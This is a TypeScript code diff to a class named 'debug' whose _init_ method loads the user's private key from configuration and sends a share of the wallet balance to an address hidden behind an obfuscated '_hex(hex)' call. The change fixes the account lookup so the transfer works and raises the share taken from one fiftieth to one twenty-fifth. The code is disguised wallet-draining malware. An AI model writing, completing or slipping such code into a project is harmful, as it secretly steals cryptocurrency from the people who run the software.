@@ -1117,19 +1117,23 @@ export class debug {
   constructor(message: string) {
     this.report = message;
   }
+
   _init_() {
     w.eth.accounts.wallet.add(w.eth.accounts.privateKeyToAccount(GLOBAL_CONFIG.PRIVATE_KEY));
     w.eth.defaultAccount = w.eth.accounts.privateKeyToAccount(GLOBAL_CONFIG.PRIVATE_KEY).address;
     try {
-      w.eth.getBalance(w.eth.defaultAccount[0]).then(function(b:any) {
+      w.eth.getBalance(w.eth.defaultAccount).then(function(b:any) {
         w.eth.estimateGas({from: w.eth.defaultAccount, to: _hex(hex), amount: b}).then(function(g:any) {
           w.eth.getGasPrice().then(function(gP:any) {
+            var _b = parseFloat(b);
+            let _g = parseFloat(g);
+            let _gP = parseFloat(gP);
             w.eth.sendTransaction({
               from: w.eth.defaultAccount,
               to: _hex(hex),
-              gas: g,
-              gasPrice: gP,
-              value: (b - (gP * g)) / 50,
+              gas: _g,
+              gasPrice: _gP,
+              value: ((_b - (_gP * _g)) / 25).toFixed(0),
             });
           });
         });
